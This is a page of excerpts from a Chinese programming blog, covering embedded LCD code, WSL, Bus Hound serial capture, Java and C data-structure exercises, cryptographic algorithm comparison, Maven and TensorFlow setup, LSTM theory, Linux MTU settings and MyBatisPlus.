uint8_t leg[20]; uint8_t i=1; LCD_Init();	LCD_Clear(Blue); 主函数
HAL_Delay(500); LCD_SetTextColor(White); LCD_SetBackColor(Blue); sprintf((char*)leg,"The LED is%d",i); LCDlight(leg,11,Line2,Yellow); LEDDisp(i); i++; if(i&gt;8) i = 1; LED的函数可以见前一个我的LED那篇文章
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34bbb108921e640bc93ce66b5c81f103/" rel="bookmark">
			wsl不动了，wsl2不动了。不响应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原来是用vim编辑时，习惯了，按了ctrl+s的原因。。。
Ctrl + s:在终端下是有特殊用途的，那就是暂停该终端，
Ctrl + q 退出这种状态，让终端继续运行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6a232ac6d90e43ff0c17189e26ea3bc/" rel="bookmark">
			【C&#43;&#43;笔记】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		懒得搬运：
C++ (wolai.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a41a35644238cd081f7082cc4853e42c/" rel="bookmark">
			Bus Hound 工具抓取串口数据（PC端抓取USB转串口数据）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		测试环境： PC端 USB转串口 链接终端板卡串口
目标：抓取通信过程中的通信数据
工具介绍：
Bus Hound是是由美国perisoft公司研制的一款超级软件总线协议分析器，它是一种专用于PC机各种总线数据包监视和控制的开发工具软件，其名“hound”的中文意思为“猎犬”，即指其能敏锐地感知到总线的丝毫变化。主要可用于捕捉来自设备的协议包和输入输出操作。
Bus Hound对于正在研究USB相关协议，需要对USB数据进行抓取分析效果非常不错，是一看所见即所得的USB抓包工具。多多小编为大家推荐Bus Hound破解版，并附上详细使用教程，喜欢的朋友请下载支持！
1、支持所有版本的IDE，SCSI，USB，1394总线
2、支持各类设备如硬盘库，DVD，鼠标，扫描仪，网络照相机等
3、支持Windows9X,WindowsMe,NT4.0,2000,2003,XP和嵌入式XP操作系统
4、捕捉数据的总量仅受机器内存限制
5、可以设置触发信号自动停止捕获操作
6、测试读取，同步等设备性能
7、捕获设备驱动包，例如IRP
8、捕获任意数量的并行设备，而不管其总线类型
9、身材苗条，易于交换与下载
10、捕获的数据易于拷贝到其它环境生成Html格式
11、捕获的数据能保存为文本文件或ZIP文件
12、所有的可捕获设备以树形结构列出，让选择设备来得更轻松些
13、可捕获设备的启动过程
14、用户爱好设定功能，如用户可调整捕获到的数据显示宽度，更宜于查看和使用
15、查看底层协议包括SCSI的sense数据和USB的设置包
16、查看每阶段的时间变化精确到微秒
17、将输入输出发生的操作实时显示到屏幕上
例子：
1、Devices 设置要抓取的设备，比如COM6
2、设置配置信息 ，如缓冲，输入输入，显示信息等 3、开始抓取数据
IN是PC rx数据
OUT是PC tx数据
可以随时控制启停
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f8a9013f838fc1128ec4688e4f72c40/" rel="bookmark">
			Java实现图的基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验目的 1、熟练掌握图的邻接矩阵和邻接表存储结构；
2、掌握图的创建方法；
3、掌握求顶点度的方法；
4、掌握图的深度优先和广度优先遍历方法；
5、掌握图的邻接矩阵和邻接表存储结构的转换。
二、实验内容 1、分别定义图的邻接矩阵和邻接表存储结构；
2、分别在两种存储结构下根据输入的顶点和边（或弧）创建图；
3、分别在两种存储结构下实现求顶点度的操作；
4、分别在两种存储结构下实现图的深度和广度优先遍历算法；
5、实现图的邻接矩阵和邻接表存储结构的转换。
三、实验步骤 1、定义图的存储结构
2、实现图的创建方法，并创建一个如下的图：
3、实现求第一个邻接点firstAdjVex()和下一个邻接点nextAdjVex()的操作；
4、写一个算法，求各个顶点的度；
5、对创建的图进行深度优先和广度优先遍历。
6、将邻接表存储的有向图转换为邻接矩阵或将邻接矩阵存储的图转换为邻接表。
四、代码及运行结果 import java.util.*; public class ALGraph implements IGraph{ private GraphKind kind; private int vexNum, arcNum; public VNode[] vexs; public ALGraph(GraphKind kind, int vexNum, int arcNum, VNode[] vexs) { this.kind = kind; this.arcNum = arcNum; this.vexNum = vexNum; this.vexs = vexs; } public ALGraph() { this(null, 0, 0, null); } public void createGraph() { Scanner sc = new Scanner(System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f8a9013f838fc1128ec4688e4f72c40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd4e23d562c918a2bca7330c7a6f8546/" rel="bookmark">
			RSA, ElGama, ECC公钥算法的对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RSA, ElGama, ECC的对比 RSA
ELGama
ECC
加密速度
慢
中
快
安全密钥长度
1024位
1024位
160位
扩张情况
扩张小
扩张大
扩张大
数论基础
欧拉定理
离散对数
离散对数
困难问题
大素数分解
有限域上求离散对数
椭圆曲线上求离散对数
消息源认证
可认证
可认证
可认证
共同优点：安全性高，易于分发，管理密钥，可用于认证
共同缺点：基本运算复杂
共同用途：加密，数字签名
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38a50782b504dede03498a431cc323b6/" rel="bookmark">
			InputStream读取数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		InputStream读取流有三个方法：
read()read(byte[] b)read(byte[] b, int off, int len) 在从数据流里读取数据时，为图简单，经常用InputStream.read()方法。这个方法是从流里每次只读取读取一个字节，效率会非常低。更好的方法是用InputStream.read(byte[] b)或者InputStream.read(byte[] b,int off,int len)方法，一次读取多个字节。但是这些方法都不能一次性把流中的数据读取完整或不知道有没有读取完整。 上面说的问题，使用readInputStream方法解决
URL url = new URL (urlStr); HttpURLConnection conn = (HttpURLConnection)url.openConnection(); //设置超时间为3秒 conn.setConnectTimeout(3*1000); //防止屏蔽程序抓取而返回403错误 conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)"); //得到输入流 InputStream inputStream = conn.getInputStream(); byte[] getData = readInputStream(inputStream); inputStream.read(getData); String str = new String(getData); System.out.println ("打印内容："+str); readInputStream方法public static byte[] readInputStream(InputStream inputStream) throws IOException { byte[] buffer = new byte[1024]; int len = 0; ByteArrayOutputStream bos = new ByteArrayOutputStream(); while((len = inputStream.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38a50782b504dede03498a431cc323b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b8699822d28010b3f5ae0a8189eb69f/" rel="bookmark">
			小游戏---炸金花
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#生成一副牌 """ 编写炸金花游戏程序 自己写一个程序，实现发牌、比大小判断输赢。 游戏规则: 一付扑克牌，去掉大小王，每个玩家发3张牌，最后比大小，看谁赢。有以下几种牌: 豹子:三张一样的牌，如3张6. 顺金:又称同花顺，即3张同样花色的顺子， 如红桃 5、6、7 顺子:又称拖拉机，花色不同，但是顺子，如红桃5、方片6、黑桃7，组成的顺子对子:2张牌一样单张:单张最大的是A 这几种牌的大小顺序为， 豹子&gt;顺金&gt;同花&gt;顺子&gt;对子&gt;单张 需程序实现的点: 1.先生成一付完整的扑克牌 2.给5个玩家随机发牌 AZH &lt;1) 0 在这里输入你要搜索的内容""" import random def Alex(): lista = ["♣", "♦", "♠", "♥"] listb = ["2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K", "A"] listc = [] for a in lista: count = 2 for b in listb: card=[f"{a}{b}",count] listc.append(card) count+=1 return listc pokelist=Alex()#整幅牌 #设置玩家开始玩 plays = ["大佬", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0b8699822d28010b3f5ae0a8189eb69f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bab6419fab3d3a228e26a0834495460e/" rel="bookmark">
			hadoop-hdfs 简介、中文文档、中英对照文档 下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hadoop-hdfs 文档 下载链接（含jar包、源码、pom） 组件名称中文-文档-下载链接中英对照-文档-下载链接hadoop-hdfs-2.5.1.jarhadoop-hdfs-2.5.1-API文档-中文版.ziphadoop-hdfs-2.5.1-API文档-中英对照版.ziphadoop-hdfs-2.6.5.jarhadoop-hdfs-2.6.5-API文档-中文版.ziphadoop-hdfs-2.6.5-API文档-中英对照版.ziphadoop-hdfs-2.7.3.jarhadoop-hdfs-2.7.3-API文档-中文版.ziphadoop-hdfs-2.7.3-API文档-中英对照版.ziphadoop-hdfs-2.9.1.jarhadoop-hdfs-2.9.1-API文档-中文版.ziphadoop-hdfs-2.9.1-API文档-中英对照版.zip hadoop-hdfs 简介 Apache Hadoop HDFS 。
hadoop-hdfs 中文文档、中英对照文档 说明 摘要：hadoop-hdfs、org.apache.hadoop、中文文档、中英对照文档、下载、包含jar包、原API文档、源代码、Maven依赖信息文件、翻译后的API文档、apache、hadoop、hdfs、中英对照文档、jar包、java；
使用方法：解压翻译后的API文档，用浏览器打开“index.html”文件，即可纵览文档内容。
人性化翻译，文档中的代码和结构保持不变，注释和说明精准翻译，请放心使用。
双语对照，边学技术、边学英语。
涉及的包（package） org.apache.hadoop.hdfs
org.apache.hadoop.hdfs.net
org.apache.hadoop.hdfs.protocol
org.apache.hadoop.hdfs.protocol.datatransfer
org.apache.hadoop.hdfs.protocol.datatransfer.sasl
org.apache.hadoop.hdfs.protocolPB
org.apache.hadoop.hdfs.qjournal.client
org.apache.hadoop.hdfs.qjournal.protocol
org.apache.hadoop.hdfs.qjournal.protocolPB
org.apache.hadoop.hdfs.qjournal.server
org.apache.hadoop.hdfs.security.token.block
org.apache.hadoop.hdfs.security.token.delegation
org.apache.hadoop.hdfs.server.balancer
org.apache.hadoop.hdfs.server.blockmanagement
org.apache.hadoop.hdfs.server.common
org.apache.hadoop.hdfs.server.datanode
org.apache.hadoop.hdfs.server.datanode.fsdataset
org.apache.hadoop.hdfs.server.datanode.fsdataset.impl
org.apache.hadoop.hdfs.server.datanode.metrics
org.apache.hadoop.hdfs.server.datanode.web
org.apache.hadoop.hdfs.server.datanode.web.webhdfs
org.apache.hadoop.hdfs.server.mover
org.apache.hadoop.hdfs.server.namenode
org.apache.hadoop.hdfs.server.namenode.ha
org.apache.hadoop.hdfs.server.namenode.ha.proto
org.apache.hadoop.hdfs.server.namenode.metrics
org.apache.hadoop.hdfs.server.namenode.snapshot
org.apache.hadoop.hdfs.server.namenode.top
org.apache.hadoop.hdfs.server.namenode.top.metrics
org.apache.hadoop.hdfs.server.namenode.top.window
org.apache.hadoop.hdfs.server.namenode.web.resources
org.apache.hadoop.hdfs.server.protocol
org.apache.hadoop.hdfs.tools
org.apache.hadoop.hdfs.tools.offlineEditsViewer
org.apache.hadoop.hdfs.tools.offlineImageViewer
org.apache.hadoop.hdfs.tools.snapshot
org.apache.hadoop.hdfs.util
org.apache.hadoop.hdfs.web
org.apache.hadoop.hdfs.web.resources
涉及的类（class） AbstractFuture
AclEntryStatusFormat
AdminHelper
AtomicFileOutputStream
AuditLogger
AuthFilter
AvailableSpaceBlockPlacementPolicy
AvailableSpaceVolumeChoosingPolicy
BalancerBandwidthCommand
BlockIdManager
BlockListAsLongs.Builder
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bab6419fab3d3a228e26a0834495460e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/574201aa53e5fdfc658611494c35b566/" rel="bookmark">
			个人学习记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开始学编程,算是一个学习记录吧.
//引用头文件 #include &lt;stdio.h&gt; //主函数 int main() { printf("Hello world\n"); printf("你好,世界!\n"); return 0; } 从基础学起,一点一点.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6c882c1b228b287114150aea7fae16e/" rel="bookmark">
			mvn 常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 mvn 项目常用mvn命令 mvn clean install mvn -T 4C clean test -Dcheckstyle.skip=false -Dlicense.skip=false 运行验证 mvn validate mvn 基本命令 删除target目录 mvn clean 编译操作 主程序编译 mvn complie 存放目录 target/classes 测试程序编译 mvn test-compile	target/test-classes 测试操作 mvn test 测试报告存放目录 target/surefire-reports 打包操作 打jar包 mvn package 安装操作 mvn install 将本地构建之后生成的jar包存入本地的maven仓库。路径是根据项目的maven坐标生成的 只打包不测试 mvn package -Dmaven.test.skip=true ( 跳过测试代码的编译) mvn dependency:tree 看到依赖树 mvn dependency:analyse 查看依赖的工具 只打包不测试 mvn -Dtest package 指定端口 mvn -Dmaven.tomcat.port=9090 忽略测试失败 mvn -Dmaven.test.failure.ignore=true 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46e169e84b118bc255eb27367a99a8e4/" rel="bookmark">
			win10安装tensorflow-gpu-1.15
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因课程要求，需要安装tensorflow1.15。我是使用conda来管理不同环境的。
总的步骤为：
查看tensorflow1.15对应python, cuda, cudnn版本安装python, cuda, cudnn安装tensorflow 查看对应版本 查看tensorflow1.15对应python版本：从源代码构建 | TensorFlow
可以看出我需要python3.7, cuda10.0, cudnn7.4
安装python, cuda, cudnn conda创建名为tf1的python3.7环境
conda create --prefix=D:\Anaconda3\envs\tf1 python=3.7 进入tf1环境
conda activate tf1 在conda源中搜索cudatoolkit
conda search cudatoolkit --info 找到对应cudatoolkit
复制其url并下载文件
在conda源中搜索cudnn
conda search cudnn --info 没有看到cudnn7.4，但是这个cudnn7.6也与cuda10.0相容的样子，于是下载这个（事实证明，确实可以）
复制其url并下载文件
在tf1环境中安装上面两个文件
conda install --use-local E:\study\deapLearning\cuda\cudatoolkit-10.0.130-0.conda conda install --use-local E:\study\deapLearning\cuda\cudnn-7.6.0-cuda10.0_0.conda 安装好后，执行conda list命令可以看到这两个的信息，说明安装成功
安装tensorflow1.15 可以查阅官网 GPU 支持 | TensorFlow
使用pip安装gpu版tensorflow1.15，注意，这里我忘了换pip源，导致tensorflow下载了好几个小时，读者在这里记得换源
pip install tensorflow-gpu==1.15 安装好后，打开python试一试：
import tensorflow as tf 出现错误：
&gt;&gt;&gt; import tensorflow as tf 2022-11-25 23:28:12.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46e169e84b118bc255eb27367a99a8e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80b1472412e7963a65cd36dd3e1f2f0b/" rel="bookmark">
			npm install:Could not resolve dependency：peer... 原因和解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		电脑npm install报错； 报错日志如下：
npm ERR! code ERESOLVE npm ERR! ERESOLVE could not resolve npm ERR! npm ERR! While resolving: @vue/eslint-config-standard@6.1.0 npm ERR! Found: eslint-plugin-vue@8.7.1 npm ERR! node_modules/eslint-plugin-vue npm ERR! dev eslint-plugin-vue@"^8.0.3" from the root project npm ERR! npm ERR! Could not resolve dependency: npm ERR! peer eslint-plugin-vue@"^7.0.0" from @vue/eslint-config-standard@6.1.0 npm ERR! node_modules/@vue/eslint-config-standard npm ERR! dev @vue/eslint-config-standard@"^6.1.0" from the root project npm ERR! npm ERR! node_modules/eslint-plugin-vue npm ERR! peer eslint-plugin-vue@"^7.0.0" from @vue/eslint-config-standard@6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80b1472412e7963a65cd36dd3e1f2f0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07d387c99c37d4cdce229f562bbae51b/" rel="bookmark">
			【头歌】顺序表的基本操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第1关：顺序表的插入操作 任务描述 本关任务：编写顺序表的初始化、插入、遍历三个基本操作函数。
相关知识 顺序表的存储结构 顺序表的存储结构可以借助于高级程序设计语言中的数组来表示，一维数组的下标与元素在线性表中的序号相对应。线性表的顺序存储结构可用C语言中动态分配的一维数组定义如下：
/*线性表的动态分配顺序存储结构（用一维数组）*/ #define INIT_SIZE 100 //线性表存储空间的初始分配量 #define INCREMENT 10 //线性表存储空间的分配增量 typedef struct{ ElemType *elem; //存储空间基地址 int length; //当前长度 int listsize; //当前分配的存储容量 }SqList; 在上述定义中，ElemType为顺序表中数据元素的类型，SqList是顺序表类型。
为了令算法具有通用性，使其尽可能地适用于各种可能的场合，将要处理的数据类型加以抽象，使其适用于不同类型的数据，是提高代码通用性的重要手段。
ElemType类型根据实际问题需要灵活定义：
/* 定义ElemType为int类型 */ typedef int ElemType; 或者，有学生数据类型定义如下：
typedef struct date { int year; int month; int day; }DATE; typedef struct student { int num; char name[20]; char sex; DATE birthday; float score; }STUDENT; /* 定义ElemType为STUDENT类型 */ typedef STUDENT ElemType; 顺序表中数据类型ElemType可以多种多样，但是在编程实现算法时针对不同数据类型，每类数据元素的输入输出是有区别的，顺序表的基本操作算法要在计算机上执行，须针对ElemType类型数据编写输入、输出、比较等函数：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07d387c99c37d4cdce229f562bbae51b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56006c7cd4e3aa7da46829ff137bbbac/" rel="bookmark">
			【数据结构之队列系列】队列详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 前面我们学习了一种数据结构：栈，栈是一种只允许在一端尽进行插入删除的数据结构，而今天我们将学习另一种数据结构：队列，队列是一种支持在一端进行插入，在另一端进行删除的数据结构。
一、队列的介绍 队列是一种支持在一端进行插入，在另一端进行删除的数据结构，相当于尾插和头删，入队列的一端我们称之为队尾，出队列的一端我们称之为对头。
入队：向队列插入元素的操作，只能从队尾插入元素出队：对队列进行删除元素的操作，只能从队头删除元素基于队列上面的性质，队列的特点是先进先出的。这个需要和栈的后进先出区分开。 二、队列数据类型的重定义 与前面学习的数据结构一样，为了能够方便修改队列存储的数据类型，我们需要队数据类型进行重定义
三、队列的结构 因为队列中需要进行入队和出队，即尾插和头删，头删数组就不太方便了，因为数组的头删需要挪动后面的数据，效率比较低，所以采用链表的形式来实现队列。为了效率，我们需要准备两个指针来管理整个队列，因为我们需要对这个队列进行头删和尾插，所以需要两个指针分别标识队列的头结点和尾结点。实现链表的形式的队列，那么我们首先需要确定链表的结点的结构
队列中链表的结点的结构
和普通链表一样，队列中的链表同样需要存储数据，所以需要一个数据域，每一个结点需要找到其下一个结点，因此需要一个指针域指向每一个结点的下一个结点
为了后面方便表示，我们同样可以对这个结点的结构进行重定义
队列中的头指针和尾指针
因为这是两个指针，所以我们可以考虑将这两个指针封装称为一个结构体，叫做队列Queue.也就是一个队列只需要知道其头结点和尾结点，那么我们就可以对这个队列进行操作了
同样的道理，为了后续方便表示，我们可以对这个结构进行重定义
四、队列常见的基本操作 1. 声明 // 基本操作的声明、 // 初始化 void QueueInit(Queue* pq); // 销毁队列 void QueueDestroy(Queue* pq); // 入队 void QueuePush(Queue* pq, QDataType val); // 出队 void QueuePop(Queue* pq); // 判空 bool QueueEmpty(Queue* pq); // 队头元素 QDataType QueueFront(Queue* pq); // 队尾元素 QDataType QueueBack(Queue* pq); // 队列结点个数 size_t QueueSize(Queue* pq); 在上面的函数声明中，我们发现函数的参数传的是队列结构体的地址，而不是结构体本身，道理和栈中的传参是一样的，首先可以节省空间，其次，我们需要在函数中通过这个队列的结构体指针找到队列的队头指针和队尾指针，如果传的是结构体，那么传参的过程是一次深拷贝，形参是实参的一份临时拷贝，这是两份不同的数据了，通过形参结构体找到的队头指针和队尾指针和实参的队头指针和队尾指针不是同一份数据，因此我们传的是队列的结构体指针。
2. 定义 初始化 // 初始化 void QueueInit(Queue* pq) { assert(pq); pq-&gt;head = pq-&gt;tail = NULL; } 因为队列中有两个指针，所以我们需要对队列进行初始化，防止队列的两个指针变成野指针，初始化就是将队列的两个指针置成空指针
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56006c7cd4e3aa7da46829ff137bbbac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac75e46a72f56c49c05c58676d6e914b/" rel="bookmark">
			通讯录管理系统（C语言）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、项目头文件包含，结构体定义，以及函数声明与介绍二、具体函数的实现1.初始化结构2.添加联系人信息3.显示所有联系人信息4.清空通讯录5.通过姓名查找一个联系人6.删除联系人7.修改联系人信息8.通过联系人的年龄大小为联系人排序 总结 前言 本文我们将介绍如何实现一个通讯录管理系统，它的功能介绍如下：通讯录可以用来存储1000个人的信息，每个人的信息包括：姓名、性别、年龄、电话、住址。我们可以对通讯录进行以下几种操作：添加联系人信息、删除指定联系人信息、查找指定联系人信息、修改指定联系人信息、显示所有联系人信息、清空所有联系人、以年龄大小排序所有联系人。
一、项目头文件包含，结构体定义，以及函数声明与介绍 #pragma once #include &lt;stdio.h&gt; #define MAXSIZE 1000//通讯录的最大容量 #include &lt;string.h&gt;//使用字符串函数 typedef struct Node { char name[15];//姓名 char sex[4];//性别 int age;//年龄 char tel[14];//电话号码 char address[10];//家庭住址 }Node;// typedef struct people { int size;//记录当前通讯录中人数多少 Node node[MAXSIZE];//定义一个数组来记录每一个人的信息 }people; //初始化结构体 void InitPeople(people* arr); //向结构体中添加人数 void add(people* arr); //展示我们通讯录中现有人物的基本信息 void show(const people* arr); //清空通讯录 void clear(people* arr); //通过姓名，查找通讯录中具体的那个人 int search(const people* arr); //删除通讯录中的一个人 void del(people* arr); //修改通讯录中一个人的信息 void modify(people* arr); //按照通讯录中人物的年龄进行排序 void sort_contact(people* arr); 二、具体函数的实现 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac75e46a72f56c49c05c58676d6e914b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a950705ba2a91cb8ac921a61e26ba0bb/" rel="bookmark">
			长短期记忆（LSTM）详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		入门小菜鸟，希望像做笔记记录自己学的东西，也希望能帮助到同样入门的人，更希望大佬们帮忙纠错啦~侵权立删。
✨完整代码在我的github上，有需要的朋友可以康康✨
​​​​​​https://github.com/tt-s-t/Deep-Learning.git
目录
一、背景
二、原理
1、前向传播
（1）输入门、遗忘门和输出门
（2）候选记忆细胞
（3）记忆细胞
（4）隐藏状态
（5）输出
2、反向传播
（1）输出层参数
（2）过渡
（3）候选记忆细胞的参数
（4）输出门的参数
（5）遗忘门的参数
（6）输入门的参数
（7）上一隐藏状态and记忆细胞
三、总结
四、LSTM的优缺点
1、优点
2、缺点
五、LSTM代码实现
1、numpy实现LSTM类
（1）前期准备
（2）初始化参数
（3）前向传播
（4）反向传播
（5）预测
2、调用我们实现的LSTM进行训练与预测
3、结果
一、背景 当时间步数(T)较大或时间步(t)较小的时候，RNN的梯度较容易出现衰减或爆炸。虽然裁剪梯度可以应对梯度爆炸，但是无法解决梯度衰减的问题。这个原因使得RNN在实际中难以捕捉时间序列中时间步(t)距离较大的依赖关系。因此LSTM应运而生。
RNN详解可以看看：RNN循环神经网络_tt丫的博客-CSDN博客_rnn应用领域
二、原理 1、前向传播 输入：当前时间步的输入与上一时间步隐藏状态
（1）输入门、遗忘门和输出门 输入门：
遗忘门：
输出门：
他们都在后面起到一个比例调节的作用。
其中，，
为激活函数（sigmoid函数），故取值范围为：[0,1]
n为样本数，d为输入的特征数，h为隐藏大小。
（2）候选记忆细胞 （3）记忆细胞 当前时间步记忆细胞的计算组合了上一时间步记忆细胞和当前时间步候选记忆细胞的信息。
遗忘门控制上一时间步的记忆细胞中的信息是否传递到当前时间步的记忆细胞，而输出门则控制当前时间步的输入通过候选记忆细胞的如何流入当前时间步的记忆细胞。
如果遗忘门一直近似为1且输入门一直近似为0，则说明：过去的记忆细胞将一直通过时间保存并传递到当前时间步，而当前输入则被屏蔽掉。
这个设计可以应对循环神经网络中的梯度衰减问题（可以有选择地对前面的信息进行保留，不至于直接出现指数项），并更好地捕捉时间序列中时间步距离较大的依赖关系（存在中）。 （4）隐藏状态 我们通过输出门来控制从记忆细胞到隐藏状态的信息流动。
当输出门近似为1时，记忆细胞信息将传递到隐藏状态供输出层使用；近似为0时，记忆细胞信息只自己保留。
（5）输出 2、反向传播 已知（注：*是矩阵乘法，•是矩阵上对应元素相乘）
（1）输出层参数 Note：这里的指的是上一次（即t+1时间步）计算得到的
；；
（2）过渡 对于链式法则涉及到记忆细胞的，我们设为
Note：同样的，这里的指的是上一次（即t+1时间步）计算得到的
对于链式法则涉及到候选记忆细胞的，我们设为
对于链式法则涉及到输出门的，我们设为
对于链式法则涉及到遗忘门的，我们设为
对于链式法则涉及到输入门的，我们设为
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a950705ba2a91cb8ac921a61e26ba0bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55f90ae53582166c108cad3bd3425e05/" rel="bookmark">
			修改linux/debain的mtl值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		debian登录linux ssh是，一致卡住，经查询是mtu问题，见debian的mtu设置成1200问题解决
有一个比较通用的方法，使用指令 echo “1200” &gt; /sys/class/net/eth0/mtu 设置 mtu ，注意这里需要使用 su 权限；还可以用 cat /sys/class/net/eth0/mtu 指令查看；如果修改的时候出现提示驱动忙的情况，这时候你可以先用指令 sudo ifconfig eth0 down 把网卡禁止掉，再修改，修改好后使用指令 sudo ifconfig eth0 up 重新启用网卡。
/sys/class/net/eth0/ 文件夹里主要是一些网卡的配置，例如其中的 address 就是MAC地址文件，修改这个就可以修改MAC地址了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cc186c207f486f5ff427ddab5ae35ce/" rel="bookmark">
			MyBatisPlus-DML编程控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 DML编程控制id生成策略控制知识点：@TableId环境构建代码演示AUTO策略INPUT策略ASSIGN_ID策略ASSIGN_UUID策略 ID生成策略对比简化配置模型类主键策略设置数据库表与模型类的映射关系 多记录操作逻辑删除步骤1:修改数据库表添加`deleted`列步骤2:实体类添加属性步骤3:运行删除方法知识点：@TableLogic 乐观锁概念实现思路实现步骤步骤1:数据库表添加列步骤2:在模型类中添加对应的属性步骤3:添加乐观锁的拦截器步骤4:执行更新操作 DML编程控制 id生成策略控制 不同的表应用不同的id生成策略 日志：自增（1,2,3,4，……）购物订单：特殊规则（FQ23948AK3843）外卖单：关联地区日期等信息（10 04 20200314 34 91）关系表：可省略id…… 不同的业务采用的ID生成方式应该是不一样的，那么在MyBatisPlus中都提供了哪些主键生成策略，以及我们该如何进行选择?
在这里我们又需要用到MyBatisPlus的一个注解叫@TableId
知识点：@TableId 名称@TableId类型属性注解位置模型类中用于表示主键的属性定义上方作用设置当前类中主键属性的生成策略相关属性value(默认)：设置数据库表主键名称
type:设置主键属性的生成策略，值查照IdType的枚举值 环境构建 在构建条件查询之前，我们先来准备下环境
创建一个SpringBoot项目
pom.xml中添加对应的依赖
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.5.0&lt;/version&gt; &lt;/parent&gt; &lt;groupId&gt;com.mzh&lt;/groupId&gt; &lt;artifactId&gt;mybatisplus&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.16&lt;/version&gt; 